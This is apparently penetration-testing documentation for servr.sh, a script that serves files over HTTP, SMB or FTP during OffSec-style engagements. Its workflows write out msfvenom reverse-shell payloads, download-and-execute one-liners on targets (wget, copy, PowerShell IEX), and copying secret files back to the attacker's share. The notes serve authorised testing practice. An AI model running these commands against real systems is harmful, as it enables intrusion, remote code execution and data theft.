---
tags:
  - phase/post-exploitation
  - phase/file-transfer
  - tool/servr
  - tool/impacket
  - type/tool-docs
---

# servr.sh

## What It Is
Single-file, foreground file server launcher for OffSec engagement use. Given a mode (HTTP, SMB, or FTP), it starts the appropriate server, auto-detects Kali IP, prints a fully resolved copy-paste command box for both Linux and Windows targets, and lists the files available in the served directory.

Runs in the foreground. Ctrl+C stops the server cleanly.

---

## Quick Reference

```bash
# HTTP — most reliable, works everywhere
./servr.sh http                          # port 80, current directory
./servr.sh http --port 8080              # non-root port
./servr.sh http --dir ~/tools            # specific directory

# SMB — best for Windows targets (no curl/wget needed)
./servr.sh smb                           # port 445, current directory
./servr.sh smb --dir ~/tools --share tools
./servr.sh smb --anon                    # anonymous (no creds)

# FTP — fallback for old/locked-down Windows
./servr.sh ftp                           # port 21, current directory
./servr.sh ftp --port 2121               # non-root port
```

---

## Usage

```
./servr.sh <mode> [options]

Modes: http | smb | ftp
```

---

## Options

**Global:**

| Flag | Default | Description |
|------|---------|-------------|
| `--port N` | 80 / 445 / 21 | Listen port (per-mode defaults) |
| `--dir PATH` | current directory | Directory to serve |
| `--ip IP` | auto-detect | Override Kali IP in printed commands |

**SMB only:**

| Flag | Default | Description |
|------|---------|-------------|
| `--share NAME` | `share` | SMB share name |
| `--user USER` | `kali` | SMB username |
| `--pass PASS` | `kali` | SMB password |
| `--anon` | off | Anonymous access (no credentials) |

FTP credentials are fixed at `kali` / `kali` — change in script if needed.

---

## HTTP Mode

**Default port:** 80 (use `--port 8080` if running as non-root)

**Requires:** `python3`

**Printed commands on start:**

```bash
# Linux target
wget http://KALI_IP:PORT/FILE -O /tmp/FILE
curl -o /tmp/FILE http://KALI_IP:PORT/FILE

# Windows target (PowerShell)
iwr -uri http://KALI_IP:PORT/FILE -OutFile FILE
certutil -urlcache -split -f http://KALI_IP:PORT/FILE FILE
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP:PORT/FILE.ps1')
```

---

## SMB Mode

**Default port:** 445

**Requires:** `impacket-smbserver` (`sudo apt install python3-impacket`)

Uses `impacket-smbserver` with `-smb2support` (required for modern Windows — SMBv1 is disabled by default since Windows 10).

**Printed commands on start (authenticated):**

```powershell
# Mount as drive (cmd.exe)
net use m: \\KALI_IP\share /user:kali kali

# Direct copy — no mount needed
copy \\KALI_IP\share\FILE C:\Windows\Temp\
copy C:\loot\file.txt \\KALI_IP\share\

# PowerShell mount (authenticated)
$pass = ConvertTo-SecureString 'kali' -AsPlainText -Force
$cred = New-Object PSCredential('kali', $pass)
New-PSDrive -Name m -PSProvider FileSystem -Root \\KALI_IP\share -Credential $cred
```

**Printed commands (anonymous `--anon`):**

```powershell
net use m: \\KALI_IP\share
New-PSDrive -Name m -PSProvider FileSystem -Root \\KALI_IP\share
```

**Linux target:**

```bash
smbclient //KALI_IP/share -U kali%kali
smbclient //KALI_IP/share -N         # anonymous
```

> [!tip] SMB is the fastest option for Windows — no download command needed. `copy \\KALI_IP\share\winPEASx64.exe .` works directly from cmd.exe or PowerShell.

---

## FTP Mode

**Default port:** 21 (use `--port 2121` if running as non-root)

**Requires:** `python3` + `pyftpdlib`

```bash
pip install pyftpdlib --break-system-packages
```

Credentials default to `kali` / `kali`. Server starts with `-w` (write-enabled) — targets can upload files back.

**Printed commands on start:**

```bash
# Linux target
ftp KALI_IP 21
wget ftp://kali:kali@KALI_IP:21/FILE

# Windows target (cmd.exe)
ftp KALI_IP
# Prompt: user=kali pass=kali
# Set binary mode: binary
# Then: get FILE
```

---

## File Listing

On startup, servr.sh lists up to 20 files in the served directory with sizes. Files beyond 20 are noted with a count. Use this to confirm the file you want to transfer is actually present before pasting the download command on target.

---

## Kali IP Detection

Auto-detects in order: tun0 (VPN) → eth0 → `hostname -I`. If detection fails, printed commands show the literal string `KALI_IP` as a placeholder — replace manually.

Override with `--ip` if needed:

```bash
./servr.sh http --ip 10.10.14.5
```

---

## Port Conflict Detection

Script checks if the target port is already in use before starting and warns with a suggested alternative port. Does not block startup — just warns.

```bash
# If port 80 is in use:
./servr.sh http --port 8080

# If port 445 is in use (Samba running):
sudo systemctl stop smbd nmbd
./servr.sh smb
```

---

## Common Workflows

### Payload delivery (Windows target — most common engagement scenario)
```bash
# Step 1: generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o ~/payloads/shell.exe

# Step 2 (Terminal 1): start listener
penelope -p 443 -O

# Step 3 (Terminal 2): start server from payload directory
cd ~/payloads && ./servr.sh smb

# Step 4 (target shell): pull and execute
copy \\KALI_IP\share\shell.exe C:\Windows\Temp\shell.exe
C:\Windows\Temp\shell.exe
```

### Payload delivery (Linux target)
```bash
# Step 1: generate payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f elf -o ~/payloads/shell.elf

# Step 2 (Terminal 1): start listener
penelope -p 443 -O

# Step 3 (Terminal 2): start server
cd ~/payloads && ./servr.sh http --port 8080

# Step 4 (target shell):
wget http://KALI_IP:8080/shell.elf -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell
```

### Quick engagement-day tool drop (Linux target)
```bash
cd ~/tools
./servr.sh http --port 8080

# On target:
wget http://KALI_IP:8080/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
```

### Windows privesc tool drop
```bash
cd ~/tools
./servr.sh smb --share tools

# On target (cmd.exe or PowerShell — no download needed):
copy \\KALI_IP\tools\winPEASx64.exe C:\Users\Public\
.\winPEASx64.exe
```

### Exfil files back to Kali (SMB write)
```bash
./servr.sh smb

# On Windows target:
copy C:\Users\admin\secret.txt \\KALI_IP\share\
```

### When HTTP and SMB are both blocked
```bash
./servr.sh ftp --port 2121

# On target:
wget ftp://kali:kali@KALI_IP:2121/FILE
```

---

## Troubleshooting

```bash
# Port 80 requires root
sudo ./servr.sh http
# or
./servr.sh http --port 8080

# impacket-smbserver not found
sudo apt install python3-impacket
# or: pip install impacket --break-system-packages

# pyftpdlib not found (FTP mode)
pip install pyftpdlib --break-system-packages

# SMB connection refused on Windows — SMBv1 blocked
# impacket-smbserver uses -smb2support by default — should work
# If still failing, try HTTP or FTP instead

# Port already in use
ss -tlnp | grep ':445'
sudo systemctl stop smbd nmbd    # stop Samba if running
./servr.sh smb --port 4445       # or use alternate port

# Can't reach Kali from target — check VPN
ip a show tun0
./servr.sh http --ip $(ip -4 addr show tun0 | grep -oP '(?<=inet\s)[\d.]+')
```

---

## Related

- [[File_Transfers]] — manual fallback methods when servr.sh isn't available (restricted Kali env, pivot host serving, base64/exe2hex last resorts)
- [[Reverse_Shells]] — payload generation (msfvenom); servr.sh is the delivery mechanism post-generation
- [[pivotr]] — if target can't reach Kali directly, set up Ligolo tunnel first, then run servr.sh normally (use pivot IP on target)
- [[escalatr]] — tools staged and served by escalatr.sh use HTTP (same pattern as servr.sh http)
